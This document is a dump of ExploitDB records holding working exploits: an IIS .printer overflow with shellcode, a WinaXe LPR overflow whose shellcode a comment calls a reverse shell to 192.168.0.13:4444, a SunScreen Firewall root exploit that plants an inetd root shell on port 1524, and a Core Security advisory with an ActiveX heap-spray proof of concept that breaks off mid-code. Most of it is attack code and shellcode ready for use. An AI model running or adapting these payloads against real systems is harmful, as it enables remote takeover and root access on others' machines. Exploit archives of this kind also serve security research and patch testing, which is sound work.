{u'code': u'/***********************************************************************\r\niishack 2000 - eEye Digital Security - 2001\r\nThis affects all unpatched windows 2000 machines with the .printer\r\nisapi filter loaded.  This is purely proof of concept.\r\n\r\nQuick rundown of the exploit:\r\n  \r\nEip overruns at position 260\r\ni have 19 bytes of code to jump back to the beginning of the buffer.\r\n(and a 4 byte eip jumping into a jmp esp located in mfc42.dll).  The \r\njumpback was kinda weird, requiring a little forward padding to protect \r\nthe rest of the code.\r\n  \r\nThe buffer itself:\r\nUou only have about 250ish bytes before the overflow(taking into \r\naccount the eip and jumpback), and like 211 after it.  this makes\r\nthings tight.  This is why i hardcoded the offsets and had 2 shellcodes,\r\none for each revision.  normally, this would suck, but since iis is kind\r\nto us, it cleanly restarts itself if we blow it, giving us another chance.\r\n\r\nThis should compile clean on windows, linux and *bsd.  Other than that, you \r\nare on your own, but the vector is a simple tcp vector, so no biggie.\r\n\r\nThe vector:\r\n\r\nthe overflow happens in the isapi handling the .printer extension.  The actual\r\noverflow is in the Host: header.  This buffer is a bit weird, soi be carfull \r\nwhat you pass into it.  It has a minimal amount of parsing happening before \r\nwe get it, making some chars not able to be used(or forcing you to encode \r\nyour payload).  As far as i can tell, the bad bytes i\'ve come across are:\r\n\r\n0x00(duh)\r\n0x0a(this inits a return, basically flaking our buffer)\r\n0x0d(same as above)\r\n0x3a(colon: - this seems to be a separator of some kind, didn\'t have time or \r\n  energy to reverse it any further,  it breaks stuff, keep it out of \r\n  your buffer)\r\n  \r\ni have a feeling that there are more bad chars, but in the shellcode i\'ve written\r\n(both this proof of concept and actual port binding shellcode),  i\'ve come across\r\nproblems, but haven\'t specifically tagged a "bad" char.\r\n\r\n\r\nOne more thing...  inititally, i got this shellcode to fit on the left side of \r\nthe buffer overflow.  something strange was causing it to fail if i had a length \r\nof under about 315 chars.  This seems strange to me, but it could be soemthing i \r\njust screwed up writing this code.  This explains the 0x03s padding the end of the\r\nshellcode.\r\n  \r\nRyan Permeh\r\nryan@eeye.com\r\n\r\ngreetz: riley, for finding the hole\r\n  marc, for being a cool boss\r\n  dale,nicula,firas, for being pimps\r\n  greg hoglund, for sparking some really interesting ideas on exploitable buffers\r\n  dark spyrit, for beginning the iis hack tradition\r\n  I would also like to thank the academy and to all of those who voted....\r\n  Barry, Levonne, and their $240.00 worth of pudding.\r\n  http://www.eeye.com/html/research/Advisories/tequila.jpg\r\n*************************************************************************/\r\n\r\n#ifdef _WIN32\r\n#include <Winsock2.h>\r\n#include <Windows.h>\r\n#define snprintf _snprintf\r\n#else\r\n#include <sys/types.h>\r\n#include <sys/socket.h>\r\n#include <netinet/in.h>\r\n#include <netdb.h>\r\n#endif\r\n#include <stdio.h>\r\n\r\nvoid usage();\r\nunsigned char GetXORValue(char *szBuff, unsigned long filesize);\r\n\r\nunsigned char sc[2][315]={\r\n  "\\x8b\\xc4\\x83\\xc0\\x11\\x33\\xc9\\x66\\xb9\\x20\\x01\\x80\\x30\\x03\\x40\\xe2\\xfa\\xeb"\r\n  "\\x03\\x03\\x03\\x03\\x5c\\x88\\xe8\\x82\\xef\\x8f\\x09\\x03\\x03\\x44\\x80\\x3c\\xfc\\x76"\r\n  "\\xf9\\x80\\xc4\\x07\\x88\\xf6\\x30\\xca\\x83\\xc2\\x07\\x88\\x04\\x8a\\x05\\x80\\xc5\\x07"\r\n  "\\x80\\xc4\\x07\\xe1\\xf7\\x30\\xc3\\x8a\\x3d\\x80\\xc5\\x07\\x80\\xc4\\x17\\x8a\\x3d\\x80"\r\n  "\\xc5\\x07\\x30\\xc3\\x82\\xc4\\xfc\\x03\\x03\\x03\\x53\\x6b\\x83\\x03\\x03\\x03\\x69\\x01"\r\n  "\\x53\\x53\\x6b\\x03\\x03\\x03\\x43\\xfc\\x76\\x13\\xfc\\x56\\x07\\x88\\xdb\\x30\\xc3\\x53"\r\n  "\\x54\\x69\\x48\\xfc\\x76\\x17\\x50\\xfc\\x56\\x0f\\x50\\xfc\\x56\\x03\\x53\\xfc\\x56\\x0b"\r\n  "\\xfc\\xfc\\xfc\\xfc\\xcb\\xa5\\xeb\\x74\\x8e\\x28\\xea\\x74\\xb8\\xb3\\xeb\\x74\\x27\\x49"\r\n  "\\xea\\x74\\x60\\x39\\x5f\\x74\\x74\\x74\\x2d\\x66\\x46\\x7a\\x66\\x2d\\x60\\x6c\\x6e\\x2d"\r\n  "\\x77\\x7b\\x77\\x03\\x6a\\x6a\\x70\\x6b\\x62\\x60\\x68\\x31\\x68\\x23\\x2e\\x23\\x66\\x46"\r\n  "\\x7a\\x66\\x23\\x47\\x6a\\x64\\x77\\x6a\\x62\\x6f\\x23\\x50\\x66\\x60\\x76\\x71\\x6a\\x77"\r\n  "\\x7a\\x0e\\x09\\x23\\x45\\x6c\\x71\\x23\\x67\\x66\\x77\\x62\\x6a\\x6f\\x70\\x23\\x75\\x6a"\r\n  "\\x70\\x6a\\x77\\x39\\x23\\x4b\\x77\\x77\\x73\\x39\\x2c\\x2c\\x74\\x74\\x74\\x2d\\x66\\x46"\r\n  "\\x7a\\x66\\x2d\\x60\\x6c\\x6e\\x03\\x03\\x03\\x03\\x03\\x03\\x03\\x03\\x03\\x03\\x03\\x03"\r\n  "\\x03\\x03\\x03\\x03\\x03\\x03\\x03\\x03\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\xcb\\x4a"\r\n  "\\x42\\x6c\\x90\\x90\\x90\\x90\\x66\\x81\\xec\\x14\\x01\\xff\\xe4\\x03\\x03\\x03\\x03\\x03"\r\n  "\\x03\\x03\\x03\\x03\\x03\\x03\\x03\\x03\\x03\\x03\\x03\\x03\\x03\\x03\\x03\\x03\\x03\\x00" \r\n  "\\x8b\\xc4\\x83\\xc0\\x11\\x33\\xc9\\x66\\xb9\\x20\\x01\\x80\\x30\\x03\\x40\\xe2\\xfa\\xeb"\r\n  "\\x03\\x03\\x03\\x03\\x5c\\x88\\xe8\\x82\\xef\\x8f\\x09\\x03\\x03\\x44\\x80\\x3c\\xfc\\x76"\r\n  "\\xf9\\x80\\xc4\\x07\\x88\\xf6\\x30\\xca\\x83\\xc2\\x07\\x88\\x04\\x8a\\x05\\x80\\xc5\\x07"\r\n  "\\x80\\xc4\\x07\\xe1\\xf7\\x30\\xc3\\x8a\\x3d\\x80\\xc5\\x07\\x80\\xc4\\x17\\x8a\\x3d\\x80"\r\n  "\\xc5\\x07\\x30\\xc3\\x82\\xc4\\xfc\\x03\\x03\\x03\\x53\\x6b\\x83\\x03\\x03\\x03\\x69\\x01"\r\n  "\\x53\\x53\\x6b\\x03\\x03\\x03\\x43\\xfc\\x76\\x13\\xfc\\x56\\x07\\x88\\xdb\\x30\\xc3\\x53"\r\n  "\\x54\\x69\\x48\\xfc\\x76\\x17\\x50\\xfc\\x56\\x0f\\x50\\xfc\\x56\\x03\\x53\\xfc\\x56\\x0b"\r\n  "\\xfc\\xfc\\xfc\\xfc\\x50\\x33\\xeb\\x74\\xf7\\x86\\xeb\\x74\\x2e\\xf0\\xeb\\x74\\x4c\\x30"\r\n  "\\xeb\\x74\\x60\\x39\\x5f\\x74\\x74\\x74\\x2d\\x66\\x46\\x7a\\x66\\x2d\\x60\\x6c\\x6e\\x2d"\r\n  "\\x77\\x7b\\x77\\x03\\x6a\\x6a\\x70\\x6b\\x62\\x60\\x68\\x31\\x68\\x23\\x2e\\x23\\x66\\x46"\r\n  "\\x7a\\x66\\x23\\x47\\x6a\\x64\\x77\\x6a\\x62\\x6f\\x23\\x50\\x66\\x60\\x76\\x71\\x6a\\x77"\r\n  "\\x7a\\x0e\\x09\\x23\\x45\\x6c\\x71\\x23\\x67\\x66\\x77\\x62\\x6a\\x6f\\x70\\x23\\x75\\x6a"\r\n  "\\x70\\x6a\\x77\\x39\\x23\\x4b\\x77\\x77\\x73\\x39\\x2c\\x2c\\x74\\x74\\x74\\x2d\\x66\\x46"\r\n  "\\x7a\\x66\\x2d\\x60\\x6c\\x6e\\x03\\x03\\x03\\x03\\x03\\x03\\x03\\x03\\x03\\x03\\x03\\x03"\r\n  "\\x03\\x03\\x03\\x03\\x03\\x03\\x03\\x03\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\xcb\\x4a"\r\n  "\\x42\\x6c\\x90\\x90\\x90\\x90\\x66\\x81\\xec\\x14\\x01\\xff\\xe4\\x03\\x03\\x03\\x03\\x03"\r\n  "\\x03\\x03\\x03\\x03\\x03\\x03\\x03\\x03\\x03\\x03\\x03\\x03\\x03\\x03\\x03\\x03\\x03\\x00"\r\n};\r\n\r\nmain (int argc, char *argv[])\r\n{\r\n  char request_message[500];\r\n  int X,sock,sp=0;\r\n  unsigned short serverport=htons(80);\r\n  struct hostent *nametocheck;\r\n  struct sockaddr_in serv_addr;\r\n  struct in_addr attack;\r\n#ifdef _WIN32\r\n  WORD werd;\r\n  WSADATA wsd;\r\n  werd= MAKEWORD(2,0);\r\n  WSAStartup(werd,&wsd);\r\n#endif\r\n  printf("iishack2000 - Remote .printer overflow in 2k sp0 and sp1\\n");\r\n  printf("Vulnerability found by Riley Hassell <riley@eeye.com>\\n");\r\n  printf("Exploit by Ryan Permeh <ryan@eeye.com>\\n");\r\n  if(argc < 4) usage();\r\n  if(argv[1] != NULL)\r\n  {\r\n    nametocheck = gethostbyname (argv[1]);\r\n    memcpy(&attack.s_addr,nametocheck->h_addr_list[0],4);\r\n  }\r\n  else usage();  \r\n  if(argv[2] != NULL)\r\n  {\r\n    serverport=ntohs((unsigned short)atoi(argv[2]));\r\n  }  \r\n  if(argv[3] != NULL)\r\n  {\r\n    sp=atoi(argv[3]);\r\n  }  \r\n  printf("Sending string to overflow sp %d for host: %s on port:%d\\n",sp,inet_ntoa(attack),htons(serverport));\r\n  memset(request_message,0x00,500);\r\n  snprintf(request_message,500,"GET /null.printer HTTP/1.1\\r\\nHost: %s\\r\\n\\r\\n",sc[sp]);\r\n  sock = socket (AF_INET, SOCK_STREAM, 0);\r\n  memset (&serv_addr, 0, sizeof (serv_addr));\r\n  serv_addr.sin_family=AF_INET;\r\n  serv_addr.sin_addr.s_addr = attack.s_addr;\r\n  serv_addr.sin_port = serverport;\r\n  X=connect (sock, (struct sockaddr *) &serv_addr, sizeof (serv_addr));\r\n  if(X==0)\r\n  {\r\n    send(sock,request_message,strlen(request_message)*sizeof(char),0);\r\n    printf("Sent overflow, now look on the c: drive of %s for www.eEye.com.txt\\n",inet_ntoa(attack));\r\n    printf("If the file doesn\'t exist, the server may be patched,\\nor may be a different service pack (try again with %d as the service pack)\\n",sp==0?1:0);\r\n  }\r\n  else\r\n  {\r\n    printf("Couldn\'t connect\\n",inet_ntoa(attack));\r\n  }\r\n#ifdef _WIN32\r\n  closesocket(sock); \r\n#else\r\n  close(sock);\r\n#endif\r\n  return 0;\r\n}\r\nvoid usage()\r\n{\r\n  printf("Syntax:   iishack2000 <hostname> <server port> <service pack>\\n");\r\n  printf("Example: iishack2000 127.0.0.1 80 0\\n");\r\n  printf("Example: iishack2000 127.0.0.1 80 1\\n");  \r\n  exit(1);\r\n}\r\n\r\n\r\n// milw0rm.com [2001-05-07]', u'description': u'Microsoft Windows Server 2000 SP1/SP2 - isapi .printer Extension Overflow (1)', u'platform': u'windows', u'author': u'Ryan Permeh', u'cve': [], u'source': u'ExploitDB', u'date': u'2001-05-07T00:00:00+00:00', u'_id': 266, u'type': u'remote', u'port': 80}

CVE: []
Description: WinaXe Plus 8.7 - Remote Buffer Overflow
{u'code': u'# Exploit Title: WinaXe Plus 8.7 - lpr remote buffer overflow\r\n# Date: 2017-01-16\r\n# Exploit Author: Peter Baris\r\n# Exploit link: http://www.saptech-erp.com.au/resources/winaxe_lpr.zip\r\n# Software Link: http://www.labf.com/download/winaxep-ok.html\r\n# Version: 8.7\r\n# Tested on: Windows Server 2008 R2 x64, Windows 7 SP1 x64, Windows 10 Pro x64, Windows Server 2012 R2 x64, Windows Server 2016 x64\r\n#Start the fake LPD daemon -> Add the network printer -> Close\r\n\r\nimport socket\r\n\r\n# WinAxe Plus 8.7 - lpr remote buffer overflow\r\n# Author: Peter Baris\r\n# Tested on Windows Server 2008 R2 x64, Windows 7 SP1 x64, Windows 10 Pro x64, Windows Server 2012 R2 x64, Windows Server 2016 x64\r\n \r\n#reverse shell to 192.168.0.13 port 4444, length: 351 bytes, bad characters \\x00\\x0a\\x0d\r\nshell = ("\\xb8\\xb1\\x79\\xd9\\xb5\\xdb\\xdc\\xd9\\x74\\x24\\xf4\\x5b\\x33\\xc9\\xb1"\r\n"\\x52\\x83\\xeb\\xfc\\x31\\x43\\x0e\\x03\\xf2\\x77\\x3b\\x40\\x08\\x6f\\x39"\r\n"\\xab\\xf0\\x70\\x5e\\x25\\x15\\x41\\x5e\\x51\\x5e\\xf2\\x6e\\x11\\x32\\xff"\r\n"\\x05\\x77\\xa6\\x74\\x6b\\x50\\xc9\\x3d\\xc6\\x86\\xe4\\xbe\\x7b\\xfa\\x67"\r\n"\\x3d\\x86\\x2f\\x47\\x7c\\x49\\x22\\x86\\xb9\\xb4\\xcf\\xda\\x12\\xb2\\x62"\r\n"\\xca\\x17\\x8e\\xbe\\x61\\x6b\\x1e\\xc7\\x96\\x3c\\x21\\xe6\\x09\\x36\\x78"\r\n"\\x28\\xa8\\x9b\\xf0\\x61\\xb2\\xf8\\x3d\\x3b\\x49\\xca\\xca\\xba\\x9b\\x02"\r\n"\\x32\\x10\\xe2\\xaa\\xc1\\x68\\x23\\x0c\\x3a\\x1f\\x5d\\x6e\\xc7\\x18\\x9a"\r\n"\\x0c\\x13\\xac\\x38\\xb6\\xd0\\x16\\xe4\\x46\\x34\\xc0\\x6f\\x44\\xf1\\x86"\r\n"\\x37\\x49\\x04\\x4a\\x4c\\x75\\x8d\\x6d\\x82\\xff\\xd5\\x49\\x06\\x5b\\x8d"\r\n"\\xf0\\x1f\\x01\\x60\\x0c\\x7f\\xea\\xdd\\xa8\\xf4\\x07\\x09\\xc1\\x57\\x40"\r\n"\\xfe\\xe8\\x67\\x90\\x68\\x7a\\x14\\xa2\\x37\\xd0\\xb2\\x8e\\xb0\\xfe\\x45"\r\n"\\xf0\\xea\\x47\\xd9\\x0f\\x15\\xb8\\xf0\\xcb\\x41\\xe8\\x6a\\xfd\\xe9\\x63"\r\n"\\x6a\\x02\\x3c\\x23\\x3a\\xac\\xef\\x84\\xea\\x0c\\x40\\x6d\\xe0\\x82\\xbf"\r\n"\\x8d\\x0b\\x49\\xa8\\x24\\xf6\\x1a\\x17\\x10\\xf8\\xd7\\xff\\x63\\xf8\\xf6"\r\n"\\xa3\\xea\\x1e\\x92\\x4b\\xbb\\x89\\x0b\\xf5\\xe6\\x41\\xad\\xfa\\x3c\\x2c"\r\n"\\xed\\x71\\xb3\\xd1\\xa0\\x71\\xbe\\xc1\\x55\\x72\\xf5\\xbb\\xf0\\x8d\\x23"\r\n"\\xd3\\x9f\\x1c\\xa8\\x23\\xe9\\x3c\\x67\\x74\\xbe\\xf3\\x7e\\x10\\x52\\xad"\r\n"\\x28\\x06\\xaf\\x2b\\x12\\x82\\x74\\x88\\x9d\\x0b\\xf8\\xb4\\xb9\\x1b\\xc4"\r\n"\\x35\\x86\\x4f\\x98\\x63\\x50\\x39\\x5e\\xda\\x12\\x93\\x08\\xb1\\xfc\\x73"\r\n"\\xcc\\xf9\\x3e\\x05\\xd1\\xd7\\xc8\\xe9\\x60\\x8e\\x8c\\x16\\x4c\\x46\\x19"\r\n"\\x6f\\xb0\\xf6\\xe6\\xba\\x70\\x06\\xad\\xe6\\xd1\\x8f\\x68\\x73\\x60\\xd2"\r\n"\\x8a\\xae\\xa7\\xeb\\x08\\x5a\\x58\\x08\\x10\\x2f\\x5d\\x54\\x96\\xdc\\x2f"\r\n"\\xc5\\x73\\xe2\\x9c\\xe6\\x51") \r\n\r\n \r\n\r\n#100299DD - CALL ESP in xwpdllib.dll\r\nbuffer="A"*512+"\\xdd\\x99\\x02\\x10"+"\\x90"*32+shell\r\nport = 515              \r\ns = socket.socket()\r\nip = \'0.0.0.0\'             \r\ns.bind((ip, port))            \r\ns.listen(5)                    \r\n \r\nprint \'Listening on LPD port: \'+str(port)\r\n \r\nwhile True:\r\n    conn, addr = s.accept()     \r\n    conn.send(buffer)\r\n    conn.close()', u'description': u'WinaXe Plus 8.7 - Remote Buffer Overflow', u'platform': u'windows', u'author': u'Peter Baris', u'cve': [], u'source': u'ExploitDB', u'date': u'2017-01-16T00:00:00+00:00', u'_id': 41073, u'type': u'remote', u'port': 0}

CVE: []
Description: Sun Microsystems SunScreen Firewall - Privilege Escalation
{u'code': u'/*\r\n\r\nSun Microsystems SunScreen Firewall Root Exploit\r\ndiscovered & exploited by Kingcope\r\nJanuary 2011\r\n\r\nThe SunScreen Firewall can be administrated remotely via a java protocol service\r\nwhich is running on port 3858 on a SunOS machine.\r\n\r\nThis Java Service contains numerous buffer overruns (2 of which I am aware of).\r\nFurthermore it is possible to execute arbitrary code if an attacker manages\r\nto upload a file onto the target system.\r\n\r\nAs you can see in the following java exploit code the environment\r\nis not properly sanitized prior to executing shell scripts as root,\r\nthus one can use the LD technique to preload binaries or even easier\r\nmodify the PATH variable to forge the \xb4cat\xb4 binary (which is executed by lib/screenname)\r\nto be executed in a different place.\r\n\r\nThis can be exploited locally - remotely especially if anonymous ftp uploads\r\nare possible or any other file transfer protocol is activated. Uploading\r\na file via the line printer daemon might also be possible.\r\n\r\nThis has been tested on a SunOS 5.9.\r\n\r\nThe shell script to be forged as the \xb4cat\xb4 binary..\r\n\r\n#!/bin/sh\r\necho "ingreslock stream tcp nowait root /bin/sh sh -i">/tmp/x;\r\n/usr/sbin/inetd -s /tmp/x; /bin/rm -f /tmp/x\r\necho "+++ WE OWNED YA+++ WE OWNED YA+++ WE OWNED YA+++ WE OWNED YA+++ WE OWNED YA+++"\r\n#---\r\n\r\nupload above shell script to /PATH/cat\r\nchmod a+x /PATH/cat\r\nsupply target and PATH envvar to exploit\r\n\r\nOpens a root shell on port 1524/tcp (ingreslock)\r\nA successfull exploit looks like\r\n\r\n$ java SimpleClient\r\n\r\n               ?       ??\xf0?    &Connection accepted, no authentication\xb6?     O\r\n      +++ WE OWNED YA+++ WE OWNED YA+++ WE OWNED YA+++ WE OWNED YA+++ WE OWNED Y\r\nA+++\r\n\r\n$ telnet 192.168.2.3 1524\r\nTrying 192.168.2.3...\r\nConnected to 192.168.2.3.\r\nEscape character is \'^]\'.\r\n# /bin/uname -a;\r\nSunOS unknown 5.9 Generic_118558-34 sun4u sparc SUNW,Ultra-5_10\r\n                                                               ^M: not found\r\n                                                                            # /b\r\nin/id;\r\nuid=0(root) gid=1(other)\r\n                        ^M: not found\r\n                                     #\r\n\r\n*/\r\n\r\n    import java.net.*;\r\n    import java.io.*;\r\n    import java.util.*;\r\n    import java.text.DateFormat;\r\n    public class SimpleClient {\r\n\t    \r\n    public static void main(String args[]) {\r\n\t    \r\n    String str;\r\n\r\n    try {\r\n\r\n    Socket s1 = new Socket("192.168.2.3", 3853);\r\n\r\n    InputStream is = s1.getInputStream();\r\n\r\n    DataInputStream dis = new DataInputStream(is);\r\n\r\n    OutputStream s1out = s1.getOutputStream();\r\n    DataOutputStream dos = new DataOutputStream(s1out);\r\n\r\n    dos.writeByte(1);\r\n    dos.writeByte(0);\r\n    dos.writeShort(0);\r\n    dos.writeInt(0);\r\n    dos.writeByte(3);\r\n    dos.writeByte(0);\r\n    dos.writeShort(2000);\r\n    dos.writeShort(0);\r\n    dos.writeShort(0);\r\n\r\n    dos.writeUTF("0xtest");\r\n    dos.writeByte(3);\r\n    dos.writeByte(1);\r\n    dos.writeByte(1);\r\n    dos.writeByte(1);\r\n    dos.writeInt(3);\r\n    dos.writeInt(0);\r\n    dos.writeInt(0);\r\n       \r\n    dos.writeUTF("PATH=/tmp");\r\n    dos.writeUTF("lib/screenname");\r\n\r\n    dos.writeUTF("admin1");\r\n    \r\n    str = dis.readLine();\r\n    System.out.println(str);    \r\n    \r\n    str = dis.readLine();\r\n    System.out.println(str);\r\n    \r\n    dis.close();\r\n    dos.close();\r\n    s1.close();\r\n    } catch (ConnectException connExc) {\r\n    System.err.println("Could not connect to the server.");\r\n    } catch (IOException e) {\r\n    // foo\r\n    }\r\n    }\r\n    }', u'description': u'Sun Microsystems SunScreen Firewall - Privilege Escalation', u'platform': u'multiple', u'author': u'kingcope', u'cve': [], u'source': u'ExploitDB', u'date': u'2011-01-25T00:00:00+00:00', u'_id': 16041, u'type': u'remote', u'port': 0}

CVE: [u'CVE-2008-3480']
Description: Anzio Web Print Object 3.2.30 - ActiveX Buffer Overflow
{u'code': u'-----BEGIN PGP SIGNED MESSAGE-----\r\nHash: SHA1\r\n\r\n~      Core Security Technologies - CoreLabs Advisory\r\n~           http://www.coresecurity.com/corelabs/\r\n\r\n~          Anzio Web Print Object Buffer Overflow\r\n\r\n\r\n*Advisory Information*\r\n\r\nTitle: Anzio Web Print Object Buffer Overflow\r\nAdvisory ID: CORE-2008-0624\r\nAdvisory URL:\r\nhttp://www.coresecurity.com/content/anzio-web-print-object-buffer-overflow\r\nDate published: 2008-08-20\r\nDate of last update: 2008-08-20\r\nVendors contacted: Anzio\r\nRelease mode: Coordinated release\r\n\r\n\r\n*Vulnerability Information*\r\n\r\nClass: Buffer overflow\r\nRemotely Exploitable: Yes (client side)\r\nLocally Exploitable: No\r\nBugtraq ID: 30545\t\r\nCVE Name: CVE-2008-3480\t\r\n\r\n\r\n*Vulnerability Description*\r\n\r\nAnzio Web Print Object (WePO) is a Windows ActiveX web page component\r\nthat, when placed on a web page can "push" a print job from a file or\r\nweb server to a user\'s local printer without having to display the HTML\r\nequivalent to that user. By placing WePO code on a web page, you can\r\nprovide a method whereby the viewer of that web page can request a local\r\nprint of a host resident print job, archived print job or a report\r\nstream through a server-side script request.\r\n\r\nAnzio Web Print Object is vulnerable to a buffer overflow attack, which\r\ncan be exploited by remote attackers to execute arbitrary code, by\r\nproviding a malicious web page with a long "mainurl" parameter for the\r\nWePO ActiveX component.\r\n\r\n\r\n*Vulnerable Packages*\r\n\r\n. Anzio Web Print Object 3.2.19\r\n. Anzio Web Print Object 3.2.24\r\n. Anzio Print Wizard Server Edition 3.2.19\r\n. Anzio Print Wizard Personal Edition 3.2.19\r\n. Older versions are probably affected too, but were not checked.\r\n\r\n\r\n*Non-vulnerable Packages*\r\n\r\n. Anzio Web Print Object 3.2.30\r\n\r\n\r\n*Vendor Information, Solutions and Workarounds*\r\n\r\nUpdate to Anzio Web Print Object 3.2.30, available at\r\nhttp://www.anzio.com/download-wepo.htm, or visit the vendor homepage at\r\nhttp://www.anzio.com.\r\n\r\n\r\n*Credits*\r\n\r\nThis vulnerability was discovered and researched by Francisco Falcon\r\nfrom Core Security Technologies.\r\n\r\n\r\n*Technical Description / Proof of Concept Code*\r\n\r\nThe WePO ActiveX component has a parameter named "mainurl" that\r\nindicates the local file name or the URL from where to retrieve the\r\ncontent to print:\r\n\r\n/-----------\r\n\r\n<param name="mainurl" value="http://www.somewhere.com/myreport.pcl">\r\n\r\n- -----------/\r\n\r\nWePO takes the value of "mainurl" parameter in OLECHAR format and\r\ntransforms it to a BSTR string using the API SysAllocStringLen from\r\noleaut32.dll. The pointer to a BSTR string returned by SysAllocStringLen\r\nis stored in the stack.\r\n\r\n/-----------\r\n\r\n024F64B8   . 51             PUSH ECX\r\n~      ;   length of "mainurl" value\r\n024F64B9   . 52             PUSH EDX\r\n~        ;   pointer to "mainurl" value\r\n024F64BA   . E8 4DB0FFFF    CALL JMP.oleaut32.SysAllocStringLen\r\n024F64BF   . 5A             POP EDX\r\n024F64C0   . 85C0           TEST EAX,EAX\r\n024F64C2   .^0F84 94F9FFFF  JE PWBUTT~1.024F5E5C\r\n024F64C8   . 8902           MOV DWORD PTR DS:[EDX],EAX\r\n~        ;  ;Save BSTR pointer to stack\r\n024F64CA   > C3             RETN\r\n\r\n- -----------/\r\n\r\nAfter that, it copies "mainurl" value in ASCII format to a buffer on the\r\nstack, without validating its length.\r\n\r\n/-----------\r\n\r\n024F300C  /$ 56             PUSH ESI\r\n024F300D  |. 57             PUSH EDI\r\n024F300E  |. 89C6           MOV ESI,EAX\r\n~        ; ESI = pointer to "mainurl" value\r\n024F3010  |. 89D7           MOV EDI,EDX\r\n~        ; EDI = pointer to destination buffer in the stack\r\n024F3012  |. 89C8           MOV EAX,ECX\r\n~        ; ECX = length of "mainurl" value\r\n024F3014  |. 39F7           CMP EDI,ESI\r\n024F3016  |. 77 13          JA SHORT PWBUTT~1.024F302B\r\n024F3018  |. 74 2F          JE SHORT PWBUTT~1.024F3049\r\n024F301A  |. C1F9 02        SAR ECX,2\r\n024F301D  |. 78 2A          JS SHORT PWBUTT~1.024F3049\r\n024F301F  |. F3:A5          REP MOVS DWORD PTR ES:[EDI],DWORD PTR\r\nDS:[ESI]      ; Copy "mainurl" value to stack buffer,\r\n024F3021  |. 89C1           MOV ECX,EAX\r\n~        ; without validating its length\r\n024F3023  |. 83E1 03        AND ECX,3\r\n024F3026  |. F3:A4          REP MOVS BYTE PTR ES:[EDI],BYTE PTR DS:[ESI]\r\n024F3028  |. 5F             POP EDI\r\n024F3029  |. 5E             POP ESI\r\n024F302A  |. C3             RETN\t\t\r\n\r\n- -----------/\r\n\r\nBy supplying a web page with a long "mainurl" value, an attacker can\r\noverflow the stack buffer mentioned above and overwrite the SEH\r\n(Structured Exception Handler), enabling arbitrary code execution on the\r\nmachine that has the WePO ActiveX component installed. The Structured\r\nException Handler can be overwritten by providing a "mainurl" value with\r\n396 bytes as padding, plus 4 specially chosen bytes that will replace\r\nthe original SEH, allowing execution of arbitrary code with the\r\nprivileges of the current user.\r\n\r\nWhen providing such a long string as value for the "mainurl" parameter,\r\nan access violation exception is generated when WePO object calls the\r\nAPI SysFreeString to deallocate the BSTR string that was previously\r\ncreated with SysAllocStringLen. The exception raises because the\r\noriginal pointer to the BSTR string was replaced with 4 junk bytes from\r\nthe 396 padding bytes mentioned above.\r\n\r\n/-----------\r\n\r\n024F5E98  |. 50             PUSH EAX\r\n024F5E99  |. 52             PUSH EDX\r\n~        ; junk, should be pointer to BSTR string\r\n024F5E9A  |. E8 7DB6FFFF    CALL JMP.oleaut32.SysFreeString\r\n\r\n- -----------/\r\n\r\nAt this point, the Structured Exception Handler is already controlled by\r\nthe attacker, so when exception raises the execution is transferred to\r\nan arbitrary memory address chosen by the person providing the malicious\r\nweb page.\r\n\r\nBy adding JavaScript code in the malicious web page, the attacker can\r\nuse a technique called Heap Spray, that fills the heap of the browser\r\nprocess with his payload, and then jump to the arbitrary code located in\r\nthe process heap.\r\n\r\nThe following Python code will generate an HTML file that, when opened\r\non a machine with Web Print Object installed, will launch the Windows\r\nCalculator as a proof of the possibility to execute arbitrary code on a\r\nmachine that has the vulnerable ActiveX component installed. This Proof\r\nof Concept was tested in Windows XP Professional SP2 with Internet\r\nExplorer 6.0.2900.2180, and Windows XP Professional SP3 with Internet\r\nExplorer 6.0.2900.3264, but can be easily modified to work in other\r\nplatforms.\r\n\r\n/-----------\r\n\r\nmalicioushtml = open(\'WePO-PoC.html\',\'w\')\r\nheader = \'\'\'\r\n<html>\r\n<head><title>WePO Buffer Overflow PoC</title>\r\n</head>\r\n<body>\r\n\'\'\'\r\nmalicioushtml.write(header)\r\nobjeto = \'\'\'\r\n<OBJECT\r\n~  classid="clsid:4CE8026D-5DBF-48C9-B6E9-14A2B1974A3D"\r\n~\r\ncodebase="http://www.anzio.com/controls30/printwizocx.cab#version=3,0,0,0"\r\n~  width=0\r\n~  height=0\r\n~  align=center\r\n~  hspace=0\r\n~  id="botontrigger"\r\n|\r\n\'\'\'\r\nmalicioushtml.write(objeto)\r\ncraftedparam = \'<param name="mainurl" value="\'\r\ncraftedparam += \'A\' * 0x188  #0x188 padding bytes to fill the buffer\r\ncraftedparam += chr(0xFF) * 4   #indicates the end of SEH Chain\r\ncraftedparam += chr(0x0C) * 4   #overwrite the SEH, new value will be\r\n0x0C0C0C0C\r\ncraftedparam += \'">\'\r\nmalicioushtml.write(craftedparam)\r\njscode = \'\'\'\r\n~  <param name="caption" value="Rompete">\r\n~  <param name="Cancel" value="0">\r\n~  <param name="Default" value="0">\r\n~  <param name="DragCursor" value="-12">\r\n~  <param name="DragMode" value="0">\r\n~  <param name="Enabled" value="-1">\r\n~  <param name="Font" value="MS Sans Serif">\r\n~  <param name="Visible" value="-1">\r\n~  <param name="DoubleBuffered" value="0">\r\n~  <param name="Cursor" value="0">\r\n~  <param name="licensecode" value>\r\n~  <param name="printersetup" value="1">\r\n~  <param name="printername" value="printer">\r\n~  <param name="charset" value="UTF-8">\r\n~  <param name="debug" value="0">\r\n~  <param name="initfile" value>\r\n~  <param name="orientation" value>\r\n~  <param name="duplex" value>\r\n~  <param name="fontname" value>\r\n~  <param name="overlay" value>\r\n~  <param name="bitmap" value>\r\n~  <param name="preview" value="0">\r\n~  <param name="faxnum" value>\r\n~  </OBJECT>\r\n\r\n<script>\r\n~  var shellcode =\r\nunescape("%u0de8%u0000%u6b00%u7265%u656e%u336c%u2e32%u6c64%u006c%u15ff%u108c%u0040%uf08b%u08e8%u0000%u5700%u6e69%u7845%u6365%u5600%u15ff%u1030%u0040%uec81%u0400%u0000%u016a%u09e8%u0000%u6300%u6c61%u2e63%u7865%u0065%ud0ff%u0ce8%u0000%u4500%u6978%u5074%u6f72%u6563%u7373%u5600%u15ff%u1030%u0040%u006a%ud0ff");\r\n\r\n~  var spraySlide = unescape("%u9090%u9090");\r\n~  var heapSprayToAddress = 0x0c0c0c0c;\r\n\r\n~  function getSpraySlide(spraySlide, spraySlideSize)\r\n~  {\r\n~    while (spraySlide.length*2<spraySlideSize)\r\n~    {\r\n~      